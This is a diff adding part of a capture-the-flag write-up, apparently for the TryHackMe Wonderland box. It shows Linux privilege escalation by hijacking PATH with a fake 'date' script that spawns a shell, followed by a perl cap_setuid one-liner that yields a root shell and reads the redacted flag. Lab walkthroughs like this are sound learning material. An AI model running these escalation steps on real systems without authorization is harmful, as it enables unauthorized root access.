@@ -181,3 +181,40 @@ The Mad Hatter will be here soon.
 Ask very nicely, and I will give you some tea while you wait for him
 ```
 `/bin/echo -n 'Probably by ' && date --date='next hour' -R` Here we see that the `date` command is used without specifying the full path. We apply the same tactic.
+
+```
+rabbit@wonderland:/home/rabbit$ ls -l date
+-rwxr-xr-x 1 rabbit rabbit 23 Feb  9 18:44 date
+rabbit@wonderland:/home/rabbit$ cat date
+#!/bin/bash
+
+/bin/bash
+rabbit@wonderland:/home/rabbit$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
+rabbit@wonderland:/home/rabbit$ echo $PATH
+/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+rabbit@wonderland:/home/rabbit$ ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by
+hatter@wonderland:/home/rabbit$
+```
+
+Thanks to the password.txt file in the home directory of the hatter, we can now connect directly as hatter.
+```
+ESC[00;31m[+] Files with POSIX capabilities set:ESC[00m
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+Since cap_setuid is set, we can exploit this. I'm using [GTFOBins](https://gtfobins.github.io/gtfobins/perl) to help me with this.
+<img width="817" height="214" alt="image" src="https://github.com/user-attachments/assets/335e3cce-e9e8-47b8-b82e-1a506c10ba90" />
+
+```
+hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+root@wonderland:~# whoami
+root
+root@wonderland:~# cat /home/alice/root.txt
+thm{██████████████████████████████████}
+```
